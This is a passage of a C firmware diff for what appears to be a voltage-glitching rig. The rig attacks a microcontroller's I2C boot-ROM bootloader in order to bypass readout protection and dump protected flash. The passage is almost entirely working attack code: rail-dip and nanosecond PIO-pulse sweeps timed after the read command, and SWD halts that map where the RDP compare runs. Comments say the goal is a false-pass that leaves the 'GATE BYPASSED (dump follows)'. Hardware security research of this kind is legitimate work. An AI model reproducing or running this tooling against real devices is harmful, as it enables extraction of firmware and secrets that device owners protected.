+        i2cgate_thresh_raw = (uint16_t)((uint32_t)(v_threshold * 1000.0f) * 4095u / 3300u);
+        adc_power_init();
+        adc_select_input(ADC_POWER_CHAN);
+        gpio_init(SWD_NRST_PIN); gpio_set_dir(SWD_NRST_PIN, GPIO_IN); gpio_pull_up(SWD_NRST_PIN);
+        uint32_t win = i % 3;
+
+        // fire the glitch in the selected window
+        bool addr_ok = i2c_bl_cmd_with_hook(a, 0x11,
+                                            win == 0 ? i2cgate_dip_hook : NULL,
+                                            win == 1 ? i2cgate_dip_hook : NULL);
+        if (win == 2) i2cgate_dip_hook();   // post-STOP window fires inline
+        if (!addr_ok) {
+            addr_fail++;
+            reentries++;
+            i2c_bl_enter(); sleep_ms(60);   // bootloader lost — re-boot it
+            continue;
+        }
+        uint16_t vmin_raw = i2cgate_vmin_raw;
+        uint32_t dip_us = i2cgate_dip_us;
+
+        // verdict: poll the status; ACK means the check passed (or was corrupted)
+        bool verdict = false;
+        bool bus_alive = i2c_bl_wait_status(a, 100, &verdict);
+
+        if (!bus_alive) {
+            addr_fail++;
+            reentries++;
+            i2c_bl_enter(); sleep_ms(60);   // BOR reboot / stuck bus: re-boot the bootloader
+            continue;
+        }
+
+        // A NACK only counts as a calibration hit when the rail actually dipped:
+        // a full-rail reading means the glitch never fired and this NACK is
+        // meaningless (e.g. bootloader wedged). Track those separately.
+        bool dipped = (vmin_raw <= i2cgate_thresh_raw + 64);
+
+        if (verdict) {
+            ack_wins++;
+            // complete the READ (address + length + data frames)
+            uint8_t data[16] = {0};
+            if (i2c_bl_read_frames(a, 0x08000000u, data, 16)) {
+                bool allff = true;
+                for (int j = 0; j < 16; j++) if (data[j] != 0xFF) allff = false;
+                if (allff) reads_ok++; else reads_bad++;
+                // per-shot ACK log: at RDP0 the data should be all-FF (clean read);
+                // at RDP1 a non-FF read is the real dump
+                uart_cli_printf("  [%lu] win%lu dip %.2fV %luus: ACK + READ: %02X %02X %02X %02X %02X %02X %02X %02X%s\r\n",
+                                (unsigned long)i + 1, (unsigned long)win, vmin_raw * 3.3f / 4095.0f,
+                                (unsigned long)dip_us, data[0], data[1], data[2], data[3],
+                                data[4], data[5], data[6], data[7],
+                                allff ? "" : "  *** NON-FF ***");
+            } else {
+                reads_bad++;
+                uart_cli_printf("  [%lu] win%lu dip %.2fV %luus: ACK but read frames failed\r\n",
+                                (unsigned long)i + 1, (unsigned long)win, vmin_raw * 3.3f / 4095.0f,
+                                (unsigned long)dip_us);
+            }
+        } else {
+            if (dipped) {
+                nack++;
+                // calibration hits: a NACK on a dipped rail at RDP0 is a corrupted check
+                uart_cli_printf("  [%lu] win%lu dip %.2fV %luus: NACK (check corrupted? at RDP0 this is a HIT)\r\n",
+                                (unsigned long)i + 1, (unsigned long)win, vmin_raw * 3.3f / 4095.0f,
+                                (unsigned long)dip_us);
+            } else {
+                nack_nodip++;   // glitch never fired — verdict not meaningful
+            }
+        }
+
+        // step the depth (auto-sweep mode)
+        if (depth_step && v_threshold > v_min_depth) v_threshold -= depth_step / 1000.0f;
+    }
+
+    uart_cli_printf("I2CGATE: %lu attempts — ACK %lu (reads ok %lu / bad %lu), NACK-on-dip %lu, NACK-no-dip %lu, bus-dead/no-addr %lu (%lu re-entries)\r\n",
+                    (unsigned long)attempts, (unsigned long)ack_wins, (unsigned long)reads_ok,
+                    (unsigned long)reads_bad, (unsigned long)nack, (unsigned long)nack_nodip,
+                    (unsigned long)addr_fail, (unsigned long)reentries);
+    if (nack > 0) {
+        uart_cli_printf("I2CGATE: calibration HIT window: %lu corrupted-check NACKs vs %lu clean ACK reads\r\n",
+                        (unsigned long)nack, (unsigned long)ack_wins);
+    } else {
+        uart_cli_send("I2CGATE: no corrupted checks yet at this depth/timing\r\n");
+    }
+}
+
+// ============================================================================
+// I2CPROBE — where in the I2C clock-stretch does the RDP check actually run?
+//
+// SWD-attach while the target is mid-stretch (inside the boot ROM's post-0x11
+// processing), halt the core, read PC. Repeat across a sweep of delays from
+// the STOP edge. The PC histogram shows:
+//   - when rdp_locked() (0x1FFF0B94) executes relative to the STOP edge
+//   - where the cmp / `it ne; movne` verdict instructions sit
+// This maps the precise window the I2CPULSE PIO pulse must hit. The user's
+// direction: aim at corrupting the JMP/COMPARE (control flow / flags), not
+// the read value — a cmp-flag corruption can produce a false-pass at RDP1,
+// whereas corrupting the OPTCR read value only produces false-fails.
+//
+// NOTE (bench-proven earlier): halting the core while the ROM's I2C slave is
+// clock-stretching wedges the bootloader (GV stuck afterwards) — so each
+// probe attempt costs one i2c_bl_enter() re-boot. That's fine: the PC data
+// is the point.
+// ============================================================================
+void target_power_i2cprobe(uint32_t samples, uint32_t delay_us) {
+    extern bool swd_connect(void);
+    extern bool swd_halt(void);
+    extern bool swd_resume(void);
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern bool swd_clear_errors(void);
+    extern bool swd_read_core_reg(uint8_t reg, uint32_t *value);
+    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
+    extern bool i2c_bl_send_cmd_raw(uint8_t a, uint8_t cmd);
+
+    if (power_group_glitch_blocked()) return;
+    if (samples == 0) samples = 1;
+    if (samples > 500) samples = 500;
+    if (delay_us > 1000000) delay_us = 1000000;   // cap: the main loop must stay responsive
+
+    uart_cli_printf("I2CPROBE: halt mid-stretch, sweep PC at %luus after 0x11 cmd frame (%lu samples)\r\n",
+                    (unsigned long)delay_us, (unsigned long)samples);
+
+    // one shared histogram over PC (bucket by ROM address, 2-byte granularity)
+    #define PROBE_BUCKETS 24
+    struct { uint32_t pc; uint32_t n; } hist[PROBE_BUCKETS] = {0};
+    int nb = 0;
+    uint32_t halt_fail = 0, cmd_fail = 0;
+
+    swd_init();
+    uint8_t a = I2C_BL_ADDR7_DEFAULT;
+    for (uint32_t i = 0; i < samples; i++) {
+        // fresh bootloader each sample. CRITICAL: POR, not nRST — C_DEBUGEN
+        // survives nRST (bench-proven), so after the previous sample's halt the
+        // core would boot debug-held and never answer GET. The first entry after
+        // an SWD session sees swd_is_connected()==false and would take the nRST
+        // path; force the POR path by power-cycling here explicitly.
+        target_power_cycle(150);
+        i2c_bl_enter();
+        sleep_ms(60);
+        if (!i2c_bl_get(a)) { cmd_fail++; continue; }
+
+        // warm-up: the FIRST command frame after a fresh entry+GET always
+        // NACKs (bench-consistent across I2CGATE) — fire an ungated 0x02 raw
+        // frame to settle the slave, then the timed 0x11 lands cleanly
+        i2c_bl_send_cmd_raw(a, 0x02);
+        sleep_ms(5);
+
+        // CONTROL (delay_us == 999999): skip the 0x11 frame entirely — halt
+        // immediately after entry+GET+warm-up. Isolates whether the HardFault
+        // state is caused by the 0x11 command itself or by the ROM/SWD setup.
+        if (delay_us == 999999u) {
+            bool connected = false;
+            for (int r = 0; r < 10 && !connected; r++) {
+                connected = swd_connect() && swd_clear_errors();
+                if (!connected) sleep_ms(2);
+            }
+            if (!connected || !swd_halt()) { halt_fail++; swd_deinit(); continue; }
+            uint32_t pc0 = 0, xp0 = 0;
+            bool got0 = swd_read_core_reg(15, &pc0) && swd_read_core_reg(16, &xp0);
+            swd_resume();
+            swd_deinit();
+            if (!got0) { halt_fail++; continue; }
+            uart_cli_printf("  [ctl %lu] PC=0x%08lX xPSR=0x%08lX (no 0x11 sent)\r\n",
+                            (unsigned long)i + 1, (unsigned long)pc0, (unsigned long)xp0);
+            continue;
+        }
+
+        // send 0x11 cmd frame, return immediately (ROM enters post-processing)
+        if (!i2c_bl_send_cmd_raw(a, 0x11)) { cmd_fail++; continue; }
+
+        // wait the requested delay from the STOP edge, then SWD-attach + halt
+        sleep_us(delay_us);
+        bool connected = false;
+        for (int r = 0; r < 10 && !connected; r++) {
+            connected = swd_connect() && swd_clear_errors();
+            if (!connected) sleep_ms(2);
+        }
+        if (!connected || !swd_halt()) { halt_fail++; swd_deinit(); continue; }
+
+        uint32_t pc = 0, xpsr = 0, sp = 0;
+        bool got = swd_read_core_reg(15, &pc) && swd_read_core_reg(16, &xpsr) &&
+                   swd_read_core_reg(13, &sp);
+        uint32_t stk_pc = 0, stk_lr = 0, stk_cfsr = 0, stk_bfar = 0;
+        if (got && sp >= 0x20000000 && sp < 0x20018000) {
+            // basic frame: r0,r1,r2,r3,r12,lr,ret_addr(<-PC),xPSR at SP+0x14
+            uint32_t w[8];
+            if (swd_read_mem(sp, w, 8) == 8) { stk_lr = w[5]; stk_pc = w[6]; }
+            swd_read_mem(0xE000ED28, &stk_cfsr, 1);   // CFSR
+            swd_read_mem(0xE000ED38, &stk_bfar, 1);   // BFAR
+        }
+        swd_resume();
+        swd_deinit();
+        if (!got) { halt_fail++; continue; }
+
+        // diagnostic split: EXC_RETURN (high bits set) vs real code address.
+        // 0xFFFFFFFE = EXC_RETURN (exception active); xPSR low byte = exception
+        // number (3 = HardFault). 0x1FFFxxxx = boot ROM code (the target of the
+        // recon); 0x0800xxxx = flash code.
+        if ((pc & 0xF0000000) == 0xF0000000) {
+            uart_cli_printf("  [%lu] EXC_RETURN=0x%08lX exc#=%lu faulted-at PC=0x%08lX LR=0x%08lX CFSR=0x%08lX BFAR=0x%08lX\r\n",
+                            (unsigned long)i + 1, (unsigned long)pc,
+                            (unsigned long)(xpsr & 0xFF), (unsigned long)stk_pc,
+                            (unsigned long)stk_lr, (unsigned long)stk_cfsr,
+                            (unsigned long)stk_bfar);
+        }
+
+        // bucket
+        int found = -1;
+        for (int b = 0; b < nb; b++) if (hist[b].pc == pc) { found = b; break; }
+        if (found < 0 && nb < PROBE_BUCKETS) { found = nb; hist[nb].pc = pc; nb++; }
+        if (found >= 0) hist[found].n++;
+        if (i < 8) uart_cli_printf("  [%lu] PC=0x%08lX xPSR=0x%08lX\r\n",
+                                   (unsigned long)i + 1, (unsigned long)pc, (unsigned long)xpsr);
+    }
+
+    uart_cli_printf("I2CPROBE: %lu samples — halt-fail %lu, cmd-fail %lu\r\n",
+                    (unsigned long)samples, (unsigned long)halt_fail, (unsigned long)cmd_fail);
+    uart_cli_send("  PC histogram:\r\n");
+    for (int b = 0; b < nb; b++)
+        uart_cli_printf("    0x%08lX x%lu\r\n", (unsigned long)hist[b].pc, (unsigned long)hist[b].n);
+}
+
+// ============================================================================
+// I2CPULSE — PIO one-shot rail pulse inside the I2C clock-stretch.
+//
+// The RDP0 ADC-dip calibration showed post-STOP dips corrupt the check 47% of
+// the time — but the dip is µs-coarse, and at RDP1 a false-pass needs the
+// corruption to land on the cmp/`it ne; movne` verdict pair (~ns window).
+// User direction: corrupt the compare/control-flow, not the read value.
+//
+// This campaign fires a PIO pulse (6.67ns resolution) at swept offsets after
+// the 0x11 command frame's STOP edge, sweeping across the whole stretch
+// (measured legit stretch: 17-34ms; but the verdict is expected within the
+// first ~100us after STOP). Pulse width also swept. At RDP1: ACK + readable
+// flash = GATE BYPASSED (dump follows). NACKs are the normal gated response
+// and carry no signal except bus-liveness.
+// ============================================================================
+void target_power_i2cpulse(uint32_t attempts, uint32_t pause_lo, uint32_t pause_hi,
+                           uint32_t pause_step, uint32_t width_cycles) {
+    extern bool i2cpulse_start(uint32_t width_cycles);
+    extern void i2cpulse_push_pause(uint32_t pause_cycles);
+    extern void i2cpulse_fire(void);
+    extern void i2cpulse_stop(void);
+    extern bool i2c_bl_send_cmd_raw(uint8_t a, uint8_t cmd);
+
+    if (power_group_glitch_blocked()) return;
+    if (attempts == 0) attempts = 1;
+    if (attempts > 2000) attempts = 2000;
+    if (pause_step == 0) pause_step = 1;
+
+    uart_cli_printf("I2CPULSE: PIO pulse swept %lu..%lus step %lus, width %lu ticks (6.67ns each), %lu shots\r\n",
+                    (unsigned long)pause_lo, (unsigned long)pause_hi, (unsigned long)pause_step,
+                    (unsigned long)width_cycles, (unsigned long)attempts);
+
+    if (!i2cpulse_start(width_cycles)) {
+        uart_cli_send("ERROR: I2CPULSE: SM start failed (EXTERNAL mode or ARMED?)\r\n");
+        return;
+    }
+
+    // entry: boot the target into the I2C bootloader
+    target_power_ensure_on();
+    i2c_bl_enter();
+    sleep_ms(60);
+    uint8_t a = I2C_BL_ADDR7_DEFAULT;
+    if (!i2c_bl_get(a)) {
+        uart_cli_send("ERROR: I2CPULSE: bootloader not responding (GET failed)\r\n");
+        i2cpulse_stop();
+        return;
+    }
+
+    uint32_t ack_wins = 0, nack = 0, addr_fail = 0, reads_ok = 0, reads_bad = 0;
+    uint32_t reentries = 0;
+    for (uint32_t i = 0; i < attempts; i++) {
+        uint32_t pause = pause_lo + (i % ((pause_hi - pause_lo) / pause_step + 1)) * pause_step;
+        uint32_t width = width_cycles;
+
+        i2cpulse_push_pause(pause);
+
+        // send 0x11 cmd frame (raw, no verdict wait), fire the pulse at the
+        // STOP edge, then poll the verdict
+        bool addr_ok = i2c_bl_send_cmd_raw(a, 0x11);
+        if (addr_ok) i2cpulse_fire();   // fire at STOP edge (t0 reference)
+
+        bool verdict = false;
+        bool bus_alive = false;
+        if (addr_ok) {
+            bus_alive = i2c_bl_wait_status(a, 100, &verdict);
+        }
+
+        if (!addr_ok || !bus_alive) {
+            addr_fail++;
+            reentries++;
+            i2c_bl_enter(); sleep_ms(60);
+            continue;
+        }
+
+        if (verdict) {
+            ack_wins++;
+            uint8_t data[16] = {0};
+            if (i2c_bl_read_frames(a, 0x08000000u, data, 16)) {
+                bool allff = true;
+                for (int j = 0; j < 16; j++) if (data[j] != 0xFF) allff = false;
+                if (allff) reads_ok++; else reads_bad++;
+                uart_cli_printf("  [%lu] pause %lus w%lus: *** ACK + READ: %02X %02X %02X %02X %02X %02X %02X %02X%s ***\r\n",
+                                (unsigned long)i + 1, (unsigned long)pause, (unsigned long)width,
+                                data[0], data[1], data[2], data[3],
+                                data[4], data[5], data[6], data[7],
+                                allff ? "" : " NON-FF");
+            } else {
+                reads_bad++;
+                uart_cli_printf("  [%lu] pause %lus w%lus: ACK but read frames failed\r\n",
+                                (unsigned long)i + 1, (unsigned long)pause, (unsigned long)width);
+            }
+        } else {
+            nack++;   // at RDP1 this is the normal gated response — no signal
+        }
+    }
+
+    i2cpulse_stop();
+
+    uart_cli_printf("I2CPULSE: %lu shots — ACK %lu (reads ok %lu / bad %lu), NACK %lu, bus-dead/no-addr %lu (%lu re-entries)\r\n",
+                    (unsigned long)attempts, (unsigned long)ack_wins, (unsigned long)reads_ok,
+                    (unsigned long)reads_bad, (unsigned long)nack, (unsigned long)addr_fail,
+                    (unsigned long)reentries);
+    if (ack_wins > 0) {
+        uart_cli_send("I2CPULSE: *** ACK SHOTS PRESENT — inspect the ACK lines for the flash dump ***\r\n");
+    }
+}
+
+// Control experiment for ROMFPB: the identical early-attach flow (POR with
+// BOOT0=1, SWD connect inside the boot window, halt, resume, immediate I2C)
+// but NO FPB configuration at all. Bench result (kept as a regression check):
+// GV stuck even with no patch — the halt itself is what kills the bootloader's
+// I2C, which is why ROMFPB patches via AHB-AP with the core running.
+void target_power_romfpb_control(void) {
+    extern bool swd_connect(void);
+    extern bool swd_halt(void);
+    extern bool swd_resume(void);
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern bool swd_clear_errors(void);
+    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
+    extern bool i2c_bl_gv(uint8_t addr7);
+    extern void i2c_pins_reinit(void);
+
+    uart_cli_send("ROMFPB-CTL: early attach + halt + resume, NO FPB (control)\r\n");
+    target_power_ensure_on();
+    swd_init();
+    if (!swd_connect() || !swd_clear_errors()) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD connect failed before bootloader entry\r\n");
+        return;
+    }
+    gpio_init(PIN_BOOT0); gpio_set_dir(PIN_BOOT0, GPIO_OUT); gpio_put(PIN_BOOT0, 1);
+    gpio_init(PIN_BOOT1); gpio_set_dir(PIN_BOOT1, GPIO_OUT); gpio_put(PIN_BOOT1, 0);
+    i2c_pins_reinit();
+    target_power_cycle(150);
+    swd_init();
+    bool connected = false;
+    for (int i = 0; i < 20 && !connected; i++) {
+        connected = swd_connect() && swd_clear_errors();
+        if (!connected) sleep_ms(4);
+    }
+    if (!connected) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD connect failed during boot window\r\n");
+        return;
+    }
+    if (!swd_halt()) {
+        swd_deinit();
+        uart_cli_send("ERROR: halt failed in early boot\r\n");
+        return;
+    }
+    uint32_t pc = 0;
+    swd_read_core_reg(15, &pc);
+    uart_cli_printf("    halted early: pc=0x%08lX\r\n", (unsigned long)pc);
+    uart_cli_send("[2] Resuming (no patch)...\r\n");
+    if (!swd_resume()) {
+        swd_deinit();
+        uart_cli_send("ERROR: resume failed\r\n");
+        return;
+    }
+    sleep_ms(5);
+    uart_cli_send("[3] I2C GV...\r\n");
+    bool gv_ok = i2c_bl_gv(0x39);
+    if (gv_ok) {
+        uart_cli_send("ROMFPB-CTL: GV ACKed with halt+resume, no patch => FPB remap itself\r\n");
+        uart_cli_send("   breaks the ROM boot (or its SRAM table placement collides).\r\n");
+    } else {
+        uart_cli_send("ROMFPB-CTL: GV still stuck => early halt alone perturbs the bootloader;\r\n");
+        uart_cli_send("   ROMFPB window must avoid halting (patch without halt / after AHB idle).\r\n");
+    }
+    swd_deinit();
+}
 // whether the RDP byte / any OPTCR bits moved away from the locked baseline. One SWD
 // round-trip per attempt => sweeps offset x width far faster, mapping the window.
 // CAVEATS (by design): (1) SWD is connected only AFTER the glitch, so it doesn't
